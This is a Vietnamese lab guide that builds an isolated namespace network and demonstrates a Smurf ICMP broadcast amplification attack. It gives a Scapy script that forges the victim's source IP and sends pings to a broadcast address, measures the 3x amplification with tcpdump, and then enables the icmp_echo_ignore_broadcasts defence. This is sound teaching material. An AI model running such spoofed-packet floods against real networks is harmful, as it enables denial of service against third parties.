# HƯỚNG DẪN THỰC HÀNH: LAB 04
## Smurf Attack (ICMP Broadcast Amplification DoS)

---

### 1. MỤC TIÊU & MÔ HÌNH MẠNG
- **Mục tiêu:** Thực hiện tấn công từ chối dịch vụ khuếch đại Smurf Attack bằng cách gửi gói ICMP Echo Request tới địa chỉ Directed Broadcast (`10.0.0.255`) với IP nguồn giả mạo của nạn nhân (`10.0.0.200`). Toàn bộ các trạm khuếch đại trong subnet đồng loạt phản hồi, tạo hệ số khuếch đại $K = \times 3$. Sau đó kích hoạt phòng thủ `net.ipv4.icmp_echo_ignore_broadcasts = 1`.
- **Topology:** Mạng LAN ảo trên Linux Bridge `br0` gồm 5 namespaces:
  - `atk`: `10.0.0.100/24` (Attacker)
  - `vic`: `10.0.0.200/24` (Victim)
  - `amp1`, `amp2`, `amp3`: `10.0.0.11`, `10.0.0.12`, `10.0.0.13` (3 trạm khuếch đại)

---

### 2. BƯỚC 1: KHỞI TẠO THƯ MỤC VÀ TẠO CÁC SCRIPT

Tạo thư mục `/tmp/lab04` và tạo 2 script bằng `cat << 'EOF'` (hoặc dùng `nano <tên_file>` để soạn thảo):

```bash
mkdir -p /tmp/lab04 && cd /tmp/lab04

# 1. Script thiết lập mạng LAN Bridge: setup_lan.sh
cat << 'EOF' > /tmp/lab04/setup_lan.sh
#!/usr/bin/env bash
set -e

echo "[*] Dọn dẹp namespace cũ và bridge nếu còn tồn tại..."
for ns in atk vic amp1 amp2 amp3 h1 h2; do
    ip netns del "$ns" 2>/dev/null || true
done
ip link del br0 2>/dev/null || true

echo "[*] Tạo Linux Bridge br0..."
ip link add name br0 type bridge
ip link set dev br0 up

add_host() {
    local ns=$1
    local ip=$2
    echo "[*] Thiết lập host $ns ($ip)..."
    
    ip netns add "$ns"
    ip link add "veth_${ns}" type veth peer name "${ns}0"
    ip link set "${ns}0" netns "$ns"
    ip link set "veth_${ns}" master br0
    ip link set "veth_${ns}" up
    
    ip netns exec "$ns" ip link set dev lo up
    ip netns exec "$ns" ip addr add "${ip}/24" brd 10.0.0.255 dev "${ns}0"
    ip netns exec "$ns" ip link set dev "${ns}0" up
}

add_host "atk"  "10.0.0.100"
add_host "vic"  "10.0.0.200"
add_host "amp1" "10.0.0.11"
add_host "amp2" "10.0.0.12"
add_host "amp3" "10.0.0.13"

echo "[*] Cấu hình 3 máy khuếch đại phản hồi broadcast (Tái tạo điều kiện dễ bị tấn công)..."
for h in amp1 amp2 amp3; do
    ip netns exec "$h" sysctl -w net.ipv4.icmp_echo_ignore_broadcasts=0
done

echo "[*] Khởi tạo bộ đệm ARP giữa các máy..."
for h in 11 12 13; do
    ip netns exec vic ping -c 1 -W 1 "10.0.0.$h" >/dev/null 2>&1 || true
    ip netns exec atk ping -c 1 -W 1 "10.0.0.$h" >/dev/null 2>&1 || true
done

echo "[+] Mạng LAN trên br0 đã sẵn sàng!"
EOF
chmod +x /tmp/lab04/setup_lan.sh

# 2. Script phát gói Smurf Attack: smurf_attack.py
cat << 'EOF' > /tmp/lab04/smurf_attack.py
#!/usr/bin/env python3
import time
from scapy.all import IP, ICMP, send

TARGET_BCAST = "10.0.0.255"
SPOOFED_VIC = "10.0.0.200"
NUM_PACKETS = 10

print(f"[*] Bắt đầu Smurf Attack từ Attacker...")
print(f"    - Đích Broadcast : {TARGET_BCAST}")
print(f"    - IP nguồn giả mạo: {SPOOFED_VIC}")
print(f"    - Tổng số gói gửi : {NUM_PACKETS}")

pkt = IP(src=SPOOFED_VIC, dst=TARGET_BCAST) / ICMP(id=0x1337)
send(pkt, count=NUM_PACKETS, inter=0.1, verbose=0)

print(f"[+] Đã gửi thành công {NUM_PACKETS} gói ICMP Echo Request tới {TARGET_BCAST}!")
EOF
```

---

### 3. BƯỚC 2: CHẠY THIẾT LẬP MẠNG

```bash
sudo bash /tmp/lab04/setup_lan.sh
```

---

### 4. BƯỚC 3: PHÁT ĐỘNG TẤN CÔNG & ĐO LƯỜNG HỆ SỐ KHUẾCH ĐẠI

1. Mở `tcpdump` trên nạn nhân (`vic`) để đón bắt các gói phản hồi:
   ```bash
   sudo ip netns exec vic timeout 8 tcpdump -i vic0 -nn icmp > /tmp/lab04/tcpdump_vic_attack.log 2>&1 &
   sleep 1
   ```
2. Phát động tấn công từ `atk`:
   ```bash
   sudo ip netns exec atk python3 /tmp/lab04/smurf_attack.py
   sleep 3
   ```
3. Đếm số lượng gói Echo Reply nhận được tại nạn nhân:
   ```bash
   grep "echo reply" /tmp/lab04/tcpdump_vic_attack.log | wc -l
   ```
   > **Quan sát:** Kết quả trả về đúng **30** gói (10 gói gửi đi từ `atk` $\rightarrow$ sinh ra 30 gói phản hồi từ `.11`, `.12`, `.13`). Hệ số khuếch đại đạt $K = 30 / 10 = \times 3$.

---

### 5. BƯỚC 4: KÍCH HOẠT PHÒNG THỦ & TÁI KIỂM CHỨNG

1. Bật cơ chế phòng vệ bỏ qua ping broadcast trên 3 máy khuếch đại:
   ```bash
   for h in amp1 amp2 amp3; do
       sudo ip netns exec $h sysctl -w net.ipv4.icmp_echo_ignore_broadcasts=1
   done
   ```
2. Mở lại `tcpdump` trên `vic` và phát lại gói tin từ `atk`:
   ```bash
   sudo ip netns exec vic timeout 6 tcpdump -i vic0 -nn icmp > /tmp/lab04/tcpdump_vic_defended.log 2>&1 &
   sleep 1
   sudo ip netns exec atk python3 /tmp/lab04/smurf_attack.py
   sleep 2
   ```
3. Đếm số lượng gói Echo Reply sau phòng thủ:
   ```bash
   grep "echo reply" /tmp/lab04/tcpdump_vic_defended.log | wc -l
   ```
   > **Quan sát:** Kết quả trả về đúng **0** gói phản hồi (Kernel các máy khuếch đại drop gói tin tự động, giảm 100% lưu lượng dội về nạn nhân).

---

### 6. BƯỚC 5: DỌN DẸP MÔI TRƯỜNG

```bash
for ns in atk vic amp1 amp2 amp3; do sudo ip netns del $ns 2>/dev/null || true; done
sudo ip link del br0 2>/dev/null || true
sudo rm -rf /tmp/lab04
```
